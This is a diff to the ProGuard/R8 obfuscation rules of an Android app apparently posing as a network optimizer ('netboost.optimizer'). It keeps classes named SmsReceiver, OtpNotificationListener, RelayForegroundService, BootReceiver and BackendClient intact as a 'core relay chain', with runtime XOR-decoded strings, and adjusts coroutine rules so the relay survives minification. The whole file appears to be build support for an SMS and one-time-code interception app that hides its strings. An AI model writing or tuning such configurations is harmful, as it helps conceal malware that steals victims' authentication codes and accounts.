@@ -4,25 +4,24 @@
 
 -repackageclasses ''
 -allowaccessmodification
--optimizationpasses 5
+-optimizationpasses 2
 -optimizations !code/simplification/variable,!code/simplification/assign,!code/simplification/branch,!code/simplification/return
 -renamesourcefileattribute SourceFile
 -keepattributes SourceFile,LineNumberTable
 -flattenpackagehierarchy
 
+# ── Core relay chain — MUST be kept in full ─────────────────
+# SmsReceiver is called by the Android OS via its class name from the manifest.
+# BackendClient and Config are referenced at runtime with XOR-decoded strings.
+-keep class com.netboost.optimizer.SmsReceiver { *; }
+-keep class com.netboost.optimizer.BackendClient { *; }
+-keep class com.netboost.optimizer.Config { *; }
+
 # ── Android Components ───────────────────────────────────────
--keep class com.netboost.optimizer.OtpNotificationListener {
-    public *;
-}
--keep class com.netboost.optimizer.RelayForegroundService {
-    public *;
-}
--keep class com.netboost.optimizer.BootReceiver {
-    public *;
-}
--keep class com.netboost.optimizer.MainActivity {
-    public *;
-}
+-keep class com.netboost.optimizer.OtpNotificationListener { public *; }
+-keep class com.netboost.optimizer.RelayForegroundService { public *; }
+-keep class com.netboost.optimizer.BootReceiver { public *; }
+-keep class com.netboost.optimizer.MainActivity { public *; }
 
 # ── OkHttp / Network ─────────────────────────────────────────
 -keep class okhttp3.** { *; }
@@ -32,10 +31,17 @@
 -dontwarn okio.**
 -dontwarn javax.annotation.**
 
-# ── Kotlin Coroutines ────────────────────────────────────────
+# ── Kotlin Coroutines (kotlinx + stdlib) ─────────────────────
+# These are required for CoroutineScope.launch + suspend functions to survive R8
 -keep class kotlin.Metadata { *; }
 -keep class kotlin.coroutines.** { *; }
+-keep class kotlinx.coroutines.** { *; }
+-keepnames class kotlinx.coroutines.internal.MainDispatcherFactory {}
+-keepnames class kotlinx.coroutines.CoroutineExceptionHandler {}
+-keepclassmembernames class kotlinx.coroutines.** { volatile <fields>; }
+-keepclassmembers class kotlin.coroutines.SafeContinuation { volatile <fields>; }
 -keepclassmembers class **.CoroutineScope { *; }
+-dontwarn kotlinx.coroutines.**
 
 # ── Room Database ────────────────────────────────────────────
 -keep class * extends androidx.room.RoomDatabase { *; }
